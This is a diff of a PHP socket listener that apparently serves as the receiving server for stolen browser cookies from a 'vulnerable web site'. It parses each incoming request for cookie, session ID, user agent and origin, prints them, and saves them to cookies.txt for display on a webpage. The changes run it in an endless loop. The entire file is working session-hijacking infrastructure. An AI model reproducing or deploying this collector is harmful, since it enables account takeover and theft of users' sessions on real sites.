@@ -1,39 +1,39 @@
 <?
-##put info a loop whole stuff
 
+$WS_PREFIX = "WS> ";
+while(true){
+
+try{
 // set some variables
 $host = "localhost";
 /*****  GETTING INFO FROM VULNARABLE WEB SITE  ******/
 $port = 6003;
-echo "listening socket..\n";
-// don’t timeout!
-set_time_limit(0);
+echo "\n###########################\nlistening socket..\n";
+
+set_time_limit(0); //no timeout
 
 // create socket
-$socket = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socketn");
+$socket = socket_create(AF_INET, SOCK_STREAM, 0);
 // bind socket to port
-$result = socket_bind($socket, $host, $port) or die("Could not bind to socketn");
+$result = socket_bind($socket, $host, $port);
 // start listening for connections
-$result = socket_listen($socket, 3) or die("Could not set up socket listenern");
+$result = socket_listen($socket, 3);
 // accept incoming connections
 
 // spawn another socket to handle communication
-$spawn = socket_accept($socket) or die("Could not accept incoming connectionn");
+$spawn = socket_accept($socket);
 
 // read client input
-$input = socket_read($spawn, 1024) or die("Could not read inputn");
-echo "\ninput is: \n";
+$input = socket_read($spawn, 1024);
+echo "\nWS: input from socket: \n";
 echo $input;
 $urlline = "";
 $clientIPAddr = "";
 $clientPort = "";
 $browserInfo = "";
 $clientOS = "";
-$referer = "";
-$date = "111";
-
-
-//todo: read first line
+$date = "";
+echo $WS_PREFIX . "COOKIE AND URL INFO:\n";
 foreach(preg_split("/((\r?\n)|(\r\n?))/", $input) as $line){
     if(strpos($line, 'GET /') !== false)
     {
@@ -41,61 +41,30 @@ foreach(preg_split("/((\r?\n)|(\r\n?))/", $input) as $line){
     }
     else if(strpos($line, 'Host') !== false)
     {
-        //get client port, parse localhost
-        $clientPort = $line;
+        $clientPort = str_replace('Host: localhost:', '', $line);
+        echo $WS_PREFIX . "client port: " . $clientPort . "\n";;
     }
     else if(strpos($line, 'User-Agent') !== false)
     {
-        //get browser and OS info
         $browserInfo = $line;
         $clientOS = $line;
+        echo $WS_PREFIX . "browser and os info: " . $browserInfo . "\n";;
     }
     else if(strpos($line, 'Origin') !== false)
     {
-        //get referer
-        $referer = $line;
+        $clientIPAddr = str_replace('Origin: ', '', $line);
+        echo $WS_PREFIX . "client IP Address: " . $clientIPAddr . "\n";
     }
 }
-echo "\n";
-
-//todo: parse by &
+# parse url parameters by &
 trim($urlline);
-echo "\n\nfields are: \n";
-echo $urlline;
-echo "\n";
 parse_str($urlline);
-//echo "\nsession ID:\n";
-//echo $sessionID;
-
-#GET cookie
-echo "\ncookie:\n";
-echo $cookie;
-echo "\n\n";
-
-
-#GET Session ID
-$sessionID = "";
-$cookiearray = explode(';', $cookie);
-	//get session id from cookies
-        for($i=0; $i<count($cookiearray); $i++){
-           $name = explode('=', $cookiearray[$i])[0];
-           $value = explode('=', $cookiearray[$i])[1];
-           echo "\n===> " . $name . " : " . $value . "\n";
-	         if($name == "PHPSESSID"){
-		            $sessionID = $value;
-		            break;
-	        }
-       }
-echo "sessionID: ";
-echo $sessionID;
-echo "\n";
-
-//todo: echo fields
-
-//todo:store them to show in a webpage
-
+echo $WS_PREFIX . "session id: " . $sessionID . "\n";
+echo $WS_PREFIX . "date: " . $date . "\n";
+echo $WS_PREFIX . "cookie: " . $cookie . "\n";
+echo $WS_PREFIX . "referer: " . $referer . "\n";
+# Display info on a webpage
 $myfile = fopen("cookies.txt", "w") or die("Unable to open file!");
-
 fwrite($myfile, "td1==>");
 fwrite($myfile, $clientIPAddr);
 fwrite($myfile,"\n");
@@ -122,14 +91,11 @@ fwrite($myfile, $date);
 fwrite($myfile,"\n");
 fclose($myfile);
 
-
-/*****  SENDING INFO TO OUR WEBPAGE ******/
-
-
-
-
-
-
+}catch(Exception $e){
+  echo "error occured :" . $e;
+  continue;
+}
+}
 // close sockets
 socket_close($spawn);
 socket_close($socket);
